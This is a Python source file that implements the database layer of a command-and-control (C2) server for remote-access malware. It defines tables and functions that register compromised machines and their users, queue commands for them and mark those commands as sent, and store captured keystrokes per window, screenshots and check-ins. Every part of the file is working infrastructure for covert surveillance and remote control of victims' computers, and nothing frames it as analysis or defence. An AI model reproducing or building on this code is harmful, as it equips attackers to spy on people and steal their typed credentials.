from sqlalchemy import create_engine, Column, Integer, String, Text, Float, Boolean, DateTime, ForeignKey, TypeDecorator
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker, relationship
from datetime import datetime
import json

# Custom JSON type for SQLite compatibility
class JSONEncoded(TypeDecorator):
    impl = Text
    cache_ok = True
    
    def process_bind_param(self, value, dialect):
        if value is not None:
            return json.dumps(value)
        return None
    
    def process_result_value(self, value, dialect):
        if value is not None:
            return json.loads(value)
        return None

Base = declarative_base()

class Client(Base):
    __tablename__ = 'clients'
    
    id = Column(Integer, primary_key=True)
    client_id = Column(String(100), unique=True, nullable=False, index=True)
    ip_address = Column(String(50))
    hostname = Column(String(100))
    username = Column(String(100))
    platform = Column(String(50))
    platform_version = Column(String(100))
    architecture = Column(String(50))
    first_seen = Column(DateTime, default=datetime.utcnow)
    last_seen = Column(DateTime, default=datetime.utcnow)
    checkin_count = Column(Integer, default=0)
    online = Column(Boolean, default=True)
    system_info = Column(JSONEncoded)
    
    # Relations
    heartbeats = relationship("Heartbeat", back_populates="client", cascade="all, delete-orphan")
    commands = relationship("Command", back_populates="client", cascade="all, delete-orphan")
    keylogs = relationship("Keylog", back_populates="client", cascade="all, delete-orphan")
    screenshots = relationship("Screenshot", back_populates="client", cascade="all, delete-orphan")
    events = relationship("Event", back_populates="client", cascade="all, delete-orphan")
    
    def to_dict(self):
        return {
            'id': self.id,
            'client_id': self.client_id,
            'ip': self.ip_address,
            'hostname': self.hostname,
            'username': self.username,
            'platform': self.platform,
            'platform_version': self.platform_version,
            'architecture': self.architecture,
            'first_seen': self.first_seen.timestamp() if self.first_seen else None,
            'last_seen': self.last_seen.timestamp() if self.last_seen else None,
            'checkin_count': self.checkin_count,
            'online': self.online,
            'system_info': self.system_info or {}
        }


class Heartbeat(Base):
    __tablename__ = 'heartbeats'
    
    id = Column(Integer, primary_key=True)
    client_id = Column(String(100), ForeignKey('clients.client_id'), nullable=False, index=True)
    timestamp = Column(DateTime, default=datetime.utcnow, index=True)
    
    client = relationship("Client", back_populates="heartbeats")


class Command(Base):
    __tablename__ = 'commands'
    
    id = Column(Integer, primary_key=True)
    command_id = Column(String(100), unique=True, nullable=False, index=True)
    client_id = Column(String(100), ForeignKey('clients.client_id'), nullable=False, index=True)
    action = Column(String(100), nullable=False, index=True)
    data = Column(JSONEncoded)
    status = Column(String(50), default='pending', index=True)  # pending, sent, completed, failed
    created_at = Column(DateTime, default=datetime.utcnow, index=True)
    sent_at = Column(DateTime)
    completed_at = Column(DateTime)
    result = Column(JSONEncoded)
    error = Column(Text)
    
    client = relationship("Client", back_populates="commands")
    
    def to_dict(self):
        return {
            'id': self.id,
            'command_id': self.command_id,
            'client_id': self.client_id,
            'action': self.action,
            'data': self.data,
            'status': self.status,
            'created_at': self.created_at.isoformat() if self.created_at else None,
            'sent_at': self.sent_at.isoformat() if self.sent_at else None,
            'completed_at': self.completed_at.isoformat() if self.completed_at else None,
            'result': self.result,
            'error': self.error
        }


class Keylog(Base):
    __tablename__ = 'keylogs'
    
    id = Column(Integer, primary_key=True)
    client_id = Column(String(100), ForeignKey('clients.client_id'), nullable=False, index=True)
    timestamp = Column(DateTime, default=datetime.utcnow, index=True)
    window = Column(String(500))
    keystroke = Column(String(100))
    
    client = relationship("Client", back_populates="keylogs")
    
    def to_dict(self):
        return {
            'id': self.id,
            'client_id': self.client_id,
            'timestamp': self.timestamp.isoformat() if self.timestamp else None,
            'window': self.window,
            'keystroke': self.keystroke
        }


class Screenshot(Base):
    __tablename__ = 'screenshots'
    
    id = Column(Integer, primary_key=True)
    client_id = Column(String(100), ForeignKey('clients.client_id'), nullable=False, index=True)
    timestamp = Column(DateTime, default=datetime.utcnow, index=True)
    width = Column(Integer)
    height = Column(Integer)
    quality = Column(Integer)
    size_kb = Column(Float)
    file_path = Column(String(500))  # Chemin vers le fichier sauvegardé
    data = Column(Text)  # Base64 si on veut stocker en BD
    
    client = relationship("Client", back_populates="screenshots")
    
    def to_dict(self):
        return {
            'id': self.id,
            'client_id': self.client_id,
            'timestamp': self.timestamp.isoformat() if self.timestamp else None,
            'width': self.width,
            'height': self.height,
            'quality': self.quality,
            'size_kb': self.size_kb,
            'file_path': self.file_path
        }


class Event(Base):
    __tablename__ = 'events'
    
    id = Column(Integer, primary_key=True)
    client_id = Column(String(100), ForeignKey('clients.client_id'), index=True)
    event_type = Column(String(50), nullable=False, index=True)  # register, disconnect, error, etc.
    description = Column(Text)
    data = Column(JSONEncoded)
    timestamp = Column(DateTime, default=datetime.utcnow, index=True)
    severity = Column(String(20), default='info', index=True)  # info, warning, error, critical
    
    client = relationship("Client", back_populates="events")
    
    def to_dict(self):
        return {
            'id': self.id,
            'client_id': self.client_id,
            'event_type': self.event_type,
            'description': self.description,
            'data': self.data,
            'timestamp': self.timestamp.isoformat() if self.timestamp else None,
            'severity': self.severity
        }


class DatabaseManager:
    def __init__(self, db_url='sqlite:///c2_server.db'):
        self.engine = create_engine(db_url, echo=False)
        Base.metadata.create_all(self.engine)
        Session = sessionmaker(bind=self.engine)
        self.session = Session()
    
    def close(self):
        self.session.close()
    
    # Client operations
    def get_or_create_client(self, client_id, system_info, ip_address):
        client = self.session.query(Client).filter_by(client_id=client_id).first()
        
        if not client:
            client = Client(
                client_id=client_id,
                ip_address=ip_address,
                hostname=system_info.get('hostname', 'Unknown'),
                username=system_info.get('username', 'Unknown'),
                platform=system_info.get('platform', 'Unknown'),
                platform_version=system_info.get('platform_version', ''),
                architecture=system_info.get('architecture', ''),
                system_info=system_info,
                first_seen=datetime.utcnow(),
                last_seen=datetime.utcnow(),
                online=True,
                checkin_count=1
            )
            self.session.add(client)
            self.log_event(client_id, 'register', 'Client registered', system_info, 'info')
        else:
            client.last_seen = datetime.utcnow()
            client.ip_address = ip_address
            client.system_info = system_info
            client.online = True
            client.checkin_count += 1
        
        self.session.commit()
        return client
    
    def update_client_heartbeat(self, client_id):
        client = self.session.query(Client).filter_by(client_id=client_id).first()
        if client:
            client.last_seen = datetime.utcnow()
            client.checkin_count += 1
            client.online = True
            
            # Enregistrer le heartbeat
            heartbeat = Heartbeat(client_id=client_id, timestamp=datetime.utcnow())
            self.session.add(heartbeat)
            
            self.session.commit()
            return True
        return False
    
    def get_all_clients(self):
        clients = self.session.query(Client).all()
        
        # Marquer offline les clients inactifs (> 60 secondes)
        current_time = datetime.utcnow()
        for client in clients:
            if client.last_seen:
                time_diff = (current_time - client.last_seen).total_seconds()
                client.online = time_diff < 60
        
        self.session.commit()
        return [c.to_dict() for c in clients]
    
    def get_client(self, client_id):
        return self.session.query(Client).filter_by(client_id=client_id).first()
    
    # Command operations
    def create_command(self, command_id, client_id, action, data):
        command = Command(
            command_id=command_id,
            client_id=client_id,
            action=action,
            data=data,
            status='pending',
            created_at=datetime.utcnow()
        )
        self.session.add(command)
        self.log_event(client_id, 'command_created', f'Command {action} created', {'command_id': command_id}, 'info')
        self.session.commit()
        return command
    
    def get_pending_commands(self, client_id):
        commands = self.session.query(Command).filter_by(
            client_id=client_id,
            status='pending'
        ).all()
        
        # Marquer comme sent
        for cmd in commands:
            cmd.status = 'sent'
            cmd.sent_at = datetime.utcnow()
        
        self.session.commit()
        return commands
    
    def update_command_result(self, command_id, result):
        command = self.session.query(Command).filter_by(command_id=command_id).first()
        if command:
            command.result = result
            command.status = 'completed' if not result.get('error') else 'failed'
            command.completed_at = datetime.utcnow()
            
            if result.get('error'):
                command.error = str(result.get('error'))
                self.log_event(command.client_id, 'command_failed', f'Command {command.action} failed', result, 'error')
            else:
                self.log_event(command.client_id, 'command_completed', f'Command {command.action} completed', None, 'info')
            
            self.session.commit()
            return True
        return False
    
    def get_command_result(self, command_id):
        command = self.session.query(Command).filter_by(command_id=command_id).first()
        return command.to_dict() if command else None
    
    # Keylog operations
    def save_keylogs(self, client_id, logs):
        for log in logs:
            keylog = Keylog(
                client_id=client_id,
                timestamp=datetime.fromisoformat(log['timestamp'].replace('Z', '+00:00')) if 'timestamp' in log else datetime.utcnow(),
                window=log.get('window', ''),
                keystroke=log.get('keystroke', '')
            )
            self.session.add(keylog)
        
        self.session.commit()
        self.log_event(client_id, 'keylogs_received', f'Received {len(logs)} keylogs', None, 'info')
    
    def get_keylogs(self, client_id, limit=100):
        keylogs = self.session.query(Keylog).filter_by(client_id=client_id).order_by(Keylog.timestamp.desc()).limit(limit).all()
        return [k.to_dict() for k in keylogs]
    
    def get_keylogs_count(self, client_id):
        return self.session.query(Keylog).filter_by(client_id=client_id).count()
    
    # Event logging
    def log_event(self, client_id, event_type, description, data=None, severity='info'):
        event = Event(
            client_id=client_id,
            event_type=event_type,
            description=description,
            data=data,
            severity=severity,
            timestamp=datetime.utcnow()
        )
        self.session.add(event)
        self.session.commit()
    
    def get_events(self, client_id=None, event_type=None, limit=100):
        query = self.session.query(Event)
        
        if client_id:
            query = query.filter_by(client_id=client_id)
        if event_type:
            query = query.filter_by(event_type=event_type)
        
        events = query.order_by(Event.timestamp.desc()).limit(limit).all()
        return [e.to_dict() for e in events]
    
    # Statistics
    def get_statistics(self):
        total_clients = self.session.query(Client).count()
        online_clients = self.session.query(Client).filter_by(online=True).count()
        total_commands = self.session.query(Command).count()
        pending_commands = self.session.query(Command).filter_by(status='pending').count()
        total_keylogs = self.session.query(Keylog).count()
        total_events = self.session.query(Event).count()
        
        return {
            'total_clients': total_clients,
            'online_clients': online_clients,
            'total_commands': total_commands,
            'pending_commands': pending_commands,
            'total_keylogs': total_keylogs,
            'total_events': total_events
        }
    
    # Cleanup old data
    def cleanup_old_data(self, days=30):
        from datetime import timedelta
        cutoff_date = datetime.utcnow() - timedelta(days=days)
        
        # Delete old heartbeats
        self.session.query(Heartbeat).filter(Heartbeat.timestamp < cutoff_date).delete()
        
        # Delete old events
        self.session.query(Event).filter(Event.timestamp < cutoff_date).delete()
        
        self.session.commit()
